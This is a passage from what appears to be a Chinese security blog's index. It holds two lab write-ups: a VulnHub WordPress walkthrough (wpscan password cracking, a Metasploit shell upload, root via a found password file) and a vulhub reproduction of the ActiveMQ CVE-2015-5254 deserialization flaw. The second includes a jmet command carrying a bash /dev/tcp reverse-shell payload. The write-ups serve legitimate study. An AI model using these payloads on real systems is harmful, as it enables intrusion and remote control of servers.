200 -   15KB - /wordpress/<br></code></pre></td></tr></table></figure>\n\n<p>看一下info.php，页面显示出来了phpinfo()信息，但是用处不是很大</p>\n<hr>\n<p>此时wpscan扫描出来了用户：c0rrupt3d_brain</p>\n<p>接着使用rockyou.txt爆破密码，成功爆破出来！</p>\n<p>c0rrupt3d_brain&#x2F;24992499</p>\n<p>本来可以直接网页访问然后登录的，但是不知道为什么可能是我的靶机出问题了一直连接不上，无奈只能使用msf搜索漏洞了</p>\n<p>（前面wpscan已经获取了版本为5.2.4）</p>\n<h1 id=\"2-找到突破口getshell\"><a href=\"#2-找到突破口getshell\" class=\"headerlink\" title=\"2 找到突破口getshell\"></a>2 找到突破口getshell</h1><p>msf搜索到了漏洞，进行配置后run，getshell</p>\n<p class='item-img' data-src='/1.png'><img src=\"/1.png\"></p>\n<p><strong>上图中的LHOST应该是RHOST，写错了</strong></p>\n<blockquote>\n<p>msf6 exploit(unix&#x2F;webapp&#x2F;wp_admin_shell_upload) &gt; set LHOST 192.168.227.132<br>LHOST &#x3D;&gt; 192.168.227.132<br>msf6 exploit(unix&#x2F;webapp&#x2F;wp_admin_shell_upload) &gt; set RHOST 192.168.227.136<br>RHOST &#x3D;&gt; 192.168.227.136</p>\n</blockquote>\n<p>LHOST是攻击地址，RHOST是受害者地址</p>\n<p>成功getshell了</p>\n<h1 id=\"3-提权\"><a href=\"#3-提权\" class=\"headerlink\" title=\"3 提权\"></a>3 提权</h1><p>受限利用python获取交互式shell（which python确认有python）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;<br></code></pre></td></tr></table></figure>\n\n<p>然后在&#x2F;home&#x2F;root3r目录下找到.root_password_ssh.txt并读取，猜测是root密码</p>\n<p>然后sudo -i输入密码，发现不是这个密码</p>\n<p>然后再尝试su root </p>\n<p>发现这个密码就对了！</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">root@ubuntu-extermely-vulnerable-m4ch1ine:# whoami<br>whoami<br>root<br></code></pre></td></tr></table></figure>\n\n<p>这个靶机完美结束！</p>\n<h1 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4 总结\"></a>4 总结</h1><p>小白的第一个靶机，磕磕碰碰的总算是成功了</p>\n<p>总结一下：</p>\n<ol>\n<li><p>信息收集获取靶机开放的端口以及服务版本，尝试使用漏洞rce进去</p>\n<p>工具：enum4linux nmap arp-scan searchspolit</p>\n</li>\n<li><p>目录爆破获取特征文件寻找突破点（例如phpinfo，wordpress）</p>\n<p>工具: dirsearch dirb wpscan cewl</p>\n</li>\n<li><p>找到突破点（getshell）之后对敏感文件进行搜索（*flag* *password*）</p>\n<p>这一步要注意使用ls -laR 不要使用ls，不然会错过隐藏文件</p>\n</li>\n<li><p>提权</p>\n</li>\n<li><p>sudo root和su root密码可能是不一样的</p>\n</li>\n</ol>\n","categories":["VulnHub"],"tags":["vuln"]},{"title":"CVE-2015-5254","url":"/2023/09/03/vulhub-CVE-2015-5254/","content":"<p>vulnhub的靶场总是获取不到靶机的ip，只能转战vulhub了</p>\n<h1 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h1><ol>\n<li><p>首先下载docker和docker compose</p>\n</li>\n<li><p>然后git clone一下vulhub的项目：</p>\n</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">git clone https://github.com/vulhub/vulhub.git<br></code></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><p>然后任意进入一个目录，例如<code>activemq/CVE-2015-5254</code></p>\n</li>\n<li><p>使用docker启动靶场</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">docker build<br>docker compose up -d<br></code></pre></td></tr></table></figure>\n</li>\n<li><p>仔细阅读漏洞的README进行复现</p>\n</li>\n</ol>\n<h1 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h1><p>vuln ip：192.168.227.135</p>\n<p>hack ip：192.168.227.132</p>\n<p class='item-img' data-src='/1.png'><img src=\"/1.png\"></p>\n<p>根据给出的readme可知，这是一个反序列化漏洞，并且需要一个叫jmet的工具</p>\n<p>在github的release中将jar文件下载下来</p>\n<p>然后执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME 192.168.227.135 61616<br></code></pre></td></tr></table></figure>\n\n<p>此时访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">http://192.168.227.135:8161/admin/browse.jsp?JMSDestination=event<br></code></pre></td></tr></table></figure>\n\n<p>可以看到出现了一个新的队列名为event</p>\n<p class='item-img' data-src='/2.png'><img src=\"/2.png\"></p>\n<p>为了验证是否成功执行了shell命令，使用nc来验证一下，首先攻击机kali执行命令</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">nc -lvvp 2333<br></code></pre></td></tr></table></figure>\n\n<p>然后再执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.227.132/2333 0&gt;&amp;1&quot; -Yp ROME 192.168.227.135 61616<br></code></pre></td></tr></table></figure>\n\n<p>然后访问靶机的web页面触发执行</p>\n<p class='item-img' data-src='/3.png'><img src=\"/3.png\"></p>\n<p>成功复现！</p>\n<p>影响范围<strong>5.13.0之前5.x的所有版本</strong></p>\n<p>该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码。</p>\n<h1 id=\"最后\"><a href=\"#最后\" class=\"headerlink\" title=\"最后\"></a>最后</h1><p>靶场配置的是存在漏洞的版本，但是在实战中我们需要自己来探测服务以及版本</p>\n<p>使用nmap探测端口的服务（或者whatweb或者一下指纹识别工具）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><code class=\"hljs plaintext\">nmap -sV -sC --min-rate 8000 -T4 192.168.227.135 -p61616<br>61616/tcp open  apachemq ActiveMQ OpenWire transport<br></code></pre></td></tr></table></figure>\n\n","categories":["VulHub"],"tags":["vuln"]}]